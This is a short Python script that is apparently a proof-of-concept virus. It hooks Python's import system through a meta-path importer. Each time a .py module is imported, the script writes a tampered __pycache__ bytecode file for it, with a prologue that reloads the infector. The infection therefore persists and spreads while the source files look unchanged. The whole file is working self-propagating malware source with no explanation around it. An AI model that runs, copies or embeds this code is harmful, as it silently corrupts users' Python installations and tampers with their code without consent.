#! /usr/bin/env python3

import importlib._bootstrap_external
import importlib.machinery
import importlib.util
import os
import sys

INFECTION = """
from importlib.machinery import SourceFileLoader
foo = SourceFileLoader("infector", "{}").load_module().main()
"""


def infect(filename):
    """Squash errors while infecting the given file."""
    try:
        _infect(filename)
    except Exception:
        raise  # Pass to avoid errors


def _infect(filename):
    """Infect the given file."""
    cfile = importlib.util.cache_from_source(filename)
    loader = importlib.machinery.SourceFileLoader('<py_compile>', filename)
    source_bytes = loader.get_data(filename)
    infected_bytes = b''
    injected = False
    has_future = b'from __future__' in source_bytes
    for line in source_bytes.split(b'\n'):
        if not injected and not has_future:
            infected_bytes += INFECTION.format(__file__).encode("ascii")
            injected = True
        infected_bytes += line + b'\n'
        if b'from __future' in line:
            has_future = False
    code = loader.source_to_code(infected_bytes, filename)
    try:
        dirname = os.path.dirname(cfile)
        if dirname:
            os.makedirs(dirname)
    except FileExistsError:
        pass
    source_stats = loader.path_stats(filename)
    bytecode = importlib._bootstrap_external._code_to_bytecode(
            code, source_stats['mtime'], source_stats['size'])
    mode = importlib._bootstrap_external._calc_mode(filename)
    try:
        importlib._bootstrap_external._write_atomic(cfile, bytecode, mode)
    except PermissionError:
        pass


class InfectImporter():
    _virus = True

    def __init__(self):
        self.inside = False
        for obj in sys.meta_path:
            if getattr(obj, "_virus", None):
                break
        else:
            sys.meta_path = [self] + sys.meta_path

    def find_spec(self, name, path=None, target=None):
        if not self.inside:
            self.inside = True
            spec = importlib.util.find_spec(name, path)
            if spec and spec.origin != 'built-in' and spec.origin and spec.origin.endswith('.py'):
                infect(spec.origin)
            self.inside = False
        return None

def main():
    print("Infected")
    InfectImporter()

if __name__ == "__main__":
    main()
